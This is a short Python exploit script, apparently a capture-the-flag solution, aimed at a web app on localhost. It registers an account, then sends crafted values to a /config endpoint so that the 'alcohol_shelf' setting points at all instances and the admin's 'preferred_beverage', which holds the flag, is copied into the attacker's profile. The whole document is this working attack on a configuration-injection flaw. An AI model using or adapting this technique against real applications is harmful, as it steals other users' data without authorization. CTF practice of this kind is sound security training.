import requests

BASE = "http://localhost/"
s = requests.Session()

# register user
s.post(BASE+"/register", data={"username":"x","password":"y"})

# pivot alcohol_shelf ke list of instances
s.post(BASE+"/config", data={"config":"alcohol_shelf","value":"_all_instances"})

# copy preferred_beverage (FLAG) dari admin ke preferred_beverage kita
s.post(BASE+"/config", data={"config":"preferred_beverage","value":"preferred_beverage"})

# lihat hasilnya
print(s.get(BASE+"/profile").text)
